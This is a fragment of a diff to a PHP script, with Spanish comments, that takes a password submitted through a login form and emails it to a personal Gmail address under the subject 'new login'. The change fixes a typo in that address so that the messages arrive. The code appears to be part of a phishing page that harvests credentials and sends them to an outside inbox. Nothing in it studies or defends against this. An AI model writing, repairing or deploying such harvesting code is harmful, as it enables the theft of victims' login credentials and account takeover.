@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $contrasena = trim($_POST['contrasena']);
 
     // Dirección de correo a la que se enviará la información
-    $destinatario = "azeangel0290qgmail.com";  // Cambia esto por tu correo real
+    $destinatario = "azeangel0290@gmail.com";  // Cambia esto por tu correo real
 
     // Asunto del correo
     $asunto = "Nuevo inicio de sesión";
